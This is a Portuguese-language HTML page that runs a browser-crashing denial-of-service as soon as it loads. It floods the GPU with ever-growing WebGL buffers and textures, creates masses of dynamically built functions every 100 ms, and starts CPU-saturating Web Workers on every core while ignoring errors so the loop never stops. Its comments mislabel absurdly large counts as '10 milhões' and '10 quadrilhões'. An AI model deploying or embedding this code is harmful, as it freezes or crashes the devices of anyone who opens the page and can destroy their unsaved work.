<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <title>WebGL Crash Instantâneo Massivo - 10 Quadrilhões</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            background: #000;
            color: #ff0000;
            font-family: 'Courier New', monospace;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            overflow: hidden;
        }
        
        .warning {
            text-align: center;
            padding: 20px;
            animation: glitch 0.5s infinite;
        }
        
        @keyframes glitch {
            0% { transform: translate(0); }
            20% { transform: translate(-2px, 2px); }
            40% { transform: translate(-2px, -2px); }
            60% { transform: translate(2px, 2px); }
            80% { transform: translate(2px, -2px); }
            100% { transform: translate(0); }
        }
        
        .status {
            font-size: 24px;
            margin: 20px;
            text-align: center;
        }
        
        .counter {
            font-size: 18px;
            margin: 10px;
        }
        
        canvas {
            border: 1px solid #ff0000;
            margin: 10px;
        }
        
        .flashing {
            animation: flash 0.3s infinite alternate;
        }
        
        @keyframes flash {
            from { opacity: 1; }
            to { opacity: 0.3; }
        }
    </style>
</head>
<body>
    <div class="warning">
        <h1>⚠️ SISTEMA SENDO TRAVADO ⚠️</h1>
        <p>CRASH WEBGL MASSIVO INSTANTÂNEO - 10 QUADRILHÕES</p>
    </div>
    
    <div class="status" id="status">INICIANDO CRASH MASSIVO...</div>
    <div class="counter">Buffers: <span id="bufferCount">0</span></div>
    <div class="counter">Funções Crash: <span id="functionCount">0</span></div>
    <div class="counter">Operações: <span id="operationCount">0</span></div>
    <canvas id="gl-canvas" width="800" height="600"></canvas>

    <script>
        // Inicializa WebGL
        const canvas = document.getElementById('gl-canvas');
        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
        
        if (!gl) {
            document.getElementById('status').textContent = 'WebGL não suportado';
            throw new Error('WebGL não suportado');
        }

        // Shaders simples
        const vertexShaderSource = `
            attribute vec2 a_position;
            void main() {
                gl_Position = vec4(a_position, 0.0, 1.0);
                gl_PointSize = 2.0;
            }
        `;
        
        const fragmentShaderSource = `
            precision highp float;
            void main() {
                gl_FragColor = vec4(1.0, 0.0, 0.0, 1.0);
            }
        `;

        // Compila shaders rapidamente
        function createShader(gl, type, source) {
            const shader = gl.createShader(type);
            gl.shaderSource(shader, source);
            gl.compileShader(shader);
            return shader;
        }

        // Cria programa WebGL
        const vertexShader = createShader(gl, gl.VERTEX_SHADER, vertexShaderSource);
        const fragmentShader = createShader(gl, gl.FRAGMENT_SHADER, fragmentShaderSource);
        const program = gl.createProgram();
        gl.attachShader(program, vertexShader);
        gl.attachShader(program, fragmentShader);
        gl.linkProgram(program);
        gl.useProgram(program);

        // Estado do crash
        let bufferCount = 0;
        let functionCount = 0;
        let operationCount = 0;
        const buffers = [];
        const crashFunctions = [];
        let crashMultiplier = 1;
        let frameCount = 0;
        
        // Elementos da UI
        const statusElement = document.getElementById('status');
        const bufferCountElement = document.getElementById('bufferCount');
        const functionCountElement = document.getElementById('functionCount');
        const operationCountElement = document.getElementById('operationCount');
        
        // Função para criar funções de crash massivamente
        function createMassiveCrashFunctions() {
            const functionsPerBatch = 1000010000100001000010000100001000010000100001000010000100001000010000100001000010000100001000010000; // 10 milhões de funções
            console.log(`Criando ${functionsPerBatch.toLocaleString()} funções de crash...`);
            
            for (let i = 0; i < functionsPerBatch; i++) {
                // Cria funções complexas que consomem memória
                const crashFunction = new Function(`
                    try {
                        const buffer = gl.createBuffer();
                        const vertices = new Float32Array(${Math.floor(1000 * crashMultiplier)});
                        for (let j = 0; j < vertices.length; j++) {
                            vertices[j] = Math.random();
                        }
                        gl.bindBuffer(gl.ARRAY_BUFFER, buffer);
                        gl.bufferData(gl.ARRAY_BUFFER, vertices, gl.DYNAMIC_DRAW);
                        
                        // Múltiplas operações WebGL
                        for (let k = 0; k < 5; k++) {
                            gl.drawArrays(gl.POINTS, 0, ${Math.floor(100 * crashMultiplier)});
                        }
                        
                        return buffer;
                    } catch(e) {
                        // Continua mesmo com erro
                        return null;
                    }
                `);
                
                crashFunctions.push(crashFunction);
                functionCount++;
                
                // Executa algumas das funções imediatamente
                if (i % 100000 === 0) {
                    try {
                        crashFunction();
                    } catch(e) {
                        // Ignora erros
                    }
                }
            }
            
            functionCountElement.textContent = functionCount.toLocaleString();
            console.log(`${functionsPerBatch.toLocaleString()} funções de crash criadas!`);
        }
        
        // Função para criar 10 quadrilhões de operações
        function createQuadrillionOperations() {
            const operationsPerBatch = 1000010000100001000010000100001000010000100001000010000100001000010000100001000010000100001000010000; // 100 milhões por lote
            const targetOperations = 100001000010000100001000010000100001000010000100001000010000100001000010000100001000010000100001000010; // 10 quadrilhões
            
            console.log(`Iniciando criação de ${targetOperations.toLocaleString()} operações...`);
            
            // Usamos Web Workers para paralelizar
            if (window.Worker) {
                const workerCount = navigator.hardwareConcurrency || 4;
                
                for (let i = 0; i < workerCount; i++) {
                    const worker = new Worker(URL.createObjectURL(new Blob([`
                        // Código do worker
                        let localOperationCount = 0;
                        const target = ${targetOperations / workerCount};
                        
                        while (localOperationCount < target) {
                            // Simula operações WebGL
                            for (let j = 0; j < ${operationsPerBatch}; j++) {
                                // Operações que consomem recursos
                                const largeArray = new Float32Array(1000);
                                for (let k = 0; k < largeArray.length; k++) {
                                    largeArray[k] = Math.random();
                                }
                                
                                // Operações matemáticas intensivas
                                let result = 0;
                                for (let k = 0; k < 100; k++) {
                                    result += Math.sin(Math.random()) * Math.cos(Math.random());
                                }
                            }
                            
                            localOperationCount += ${operationsPerBatch};
                            
                            // Reporta progresso
                            if (localOperationCount % (${operationsPerBatch} * 100) === 0) {
                                postMessage({type: 'progress', count: ${operationsPerBatch} * 100});
                            }
                        }
                        
                        postMessage({type: 'done'});
                    `])));
                    
                    worker.onmessage = function(e) {
                        if (e.data.type === 'progress') {
                            operationCount += e.data.count;
                            operationCountElement.textContent = operationCount.toLocaleString();
                        } else if (e.data.type === 'done') {
                            console.log('Worker completou suas operações');
                        }
                    };
                }
            } else {
                // Fallback sem Web Workers
                console.log('Web Workers não suportados, usando método direto');
                
                function executeOperationsBatch() {
                    for (let i = 0; i < operationsPerBatch; i++) {
                        // Operações que consomem recursos
                        const largeArray = new Float32Array(1000);
                        for (let j = 0; j < largeArray.length; j++) {
                            largeArray[j] = Math.random();
                        }
                        
                        // Operações matemáticas intensivas
                        let result = 0;
                        for (let j = 0; j < 100; j++) {
                            result += Math.sin(Math.random()) * Math.cos(Math.random());
                        }
                    }
                    
                    operationCount += operationsPerBatch;
                    operationCountElement.textContent = operationCount.toLocaleString();
                    
                    if (operationCount < targetOperations) {
                        setTimeout(executeOperationsBatch, 0);
                    }
                }
                
                executeOperationsBatch();
            }
        }
        
        // Função de crash WebGL infinito e instantâneo
        function instantWebGLCrash() {
            try {
                frameCount++;
                
                // Aumenta agressivamente o multiplicador
                crashMultiplier *= 1.5;
                
                // Cria MUITOS buffers instantaneamente
                const buffersToCreate = Math.floor(100 * crashMultiplier);
                
                for (let i = 0; i < buffersToCreate; i++) {
                    // Cria buffer com número massivo de vértices
                    const vertexCount = Math.floor(100000 * crashMultiplier);
                    const vertices = new Float32Array(vertexCount * 2);
                    
                    // Preenche com dados aleatórios
                    for (let j = 0; j < vertexCount * 2; j++) {
                        vertices[j] = Math.random() * 2 - 1;
                    }
                    
                    // Cria e armazena o buffer
                    const buffer = gl.createBuffer();
                    gl.bindBuffer(gl.ARRAY_BUFFER, buffer);
                    gl.bufferData(gl.ARRAY_BUFFER, vertices, gl.DYNAMIC_DRAW);
                    buffers.push(buffer);
                    bufferCount++;
                    
                    // Atualiza contador
                    bufferCountElement.textContent = bufferCount.toLocaleString();
                    
                    // Desenha para consumir recursos
                    const positionLocation = gl.getAttribLocation(program, 'a_position');
                    gl.enableVertexAttribArray(positionLocation);
                    gl.vertexAttribPointer(positionLocation, 2, gl.FLOAT, false, 0, 0);
                    
                    // Múltiplos desenhos por buffer
                    for (let k = 0; k < 5; k++) {
                        gl.drawArrays(gl.POINTS, 0, vertexCount);
                    }
                }
                
                // Cria texturas enormes também
                if (frameCount % 3 === 0) {
                    const texture = gl.createTexture();
                    gl.bindTexture(gl.TEXTURE_2D, texture);
                    const size = Math.min(8192, 256 * crashMultiplier);
                    const data = new Uint8Array(size * size * 4);
                    gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, size, size, 0, gl.RGBA, gl.UNSIGNED_BYTE, data);
                }
                
                // Executa algumas funções de crash aleatórias
                if (crashFunctions.length > 0 && frameCount % 2 === 0) {
                    const functionsToExecute = Math.min(1000, crashFunctions.length);
                    for (let i = 0; i < functionsToExecute; i++) {
                        const randomIndex = Math.floor(Math.random() * crashFunctions.length);
                        try {
                            crashFunctions[randomIndex]();
                        } catch(e) {
                            // Ignora erros
                        }
                    }
                }
                
                // Atualiza status
                if (frameCount < 5) {
                    statusElement.textContent = `CRASH INICIADO - Frame ${frameCount}`;
                } else if (frameCount < 15) {
                    statusElement.textContent = `ACELERANDO - ${functionCount.toLocaleString()} funções`;
                    statusElement.classList.add('flashing');
                } else {
                    statusElement.textContent = `TRAVAMENTO MASSIVO - ${functionCount.toLocaleString()} funções`;
                }
                
                // Continua o loop infinito
                requestAnimationFrame(instantWebGLCrash);
                
            } catch (e) {
                // Ignora erros e continua tentando
                statusElement.textContent = `CRASH AVANÇADO - ${functionCount.toLocaleString()} funções criadas`;
                setTimeout(instantWebGLCrash, 10);
            }
        }
        
        // Timer para criar funções massivamente a cada 0.1 segundos
        function startMassiveFunctionCreation() {
            setInterval(() => {
                createMassiveCrashFunctions();
            }, 100); // 0.1 segundos
        }
        
        // Inicia tudo quando a página carrega
        window.addEventListener('load', function() {
            statusElement.textContent = 'INICIANDO CRASH MASSIVO INSTANTÂNEO...';
            
            // Pequeno delay para garantir que tudo carregou
            setTimeout(() => {
                // Inicia a criação massiva de funções
                startMassiveFunctionCreation();
                
                // Inicia o crash WebGL
                instantWebGLCrash();
                
                // Cria primeiro lote imediatamente
                createMassiveCrashFunctions();
                
                // Inicia as 10 quadrilhões de operações
                createQuadrillionOperations();
            }, 100);
        });
        
        // Também inicia se a página já estiver carregada
        if (document.readyState === 'complete') {
            setTimeout(() => {
                startMassiveFunctionCreation();
                instantWebGLCrash();
                createMassiveCrashFunctions();
                createQuadrillionOperations();
            }, 100);
        }
        
        // Desenho inicial rápido
        gl.clearColor(0.0, 0.0, 0.0, 1.0);
        gl.clear(gl.COLOR_BUFFER_BIT);
        
    </script>
</body>
</html>
